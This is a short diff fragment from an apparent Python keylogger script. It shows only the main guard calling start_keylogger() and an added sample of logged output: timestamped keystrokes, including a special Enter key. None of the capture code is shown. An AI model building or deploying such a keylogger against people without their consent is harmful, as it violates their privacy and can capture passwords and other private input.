@@ -26,3 +26,10 @@ def start_keylogger():
 
 if __name__ == "__main__":
     start_keylogger()
+
+
+## Output Example
+
+2025-07-26 19:21:01,123 - Key pressed: h
+2025-07-26 19:21:01,456 - Key pressed: i
+2025-07-26 19:21:02,000 - Special key: Key.enter
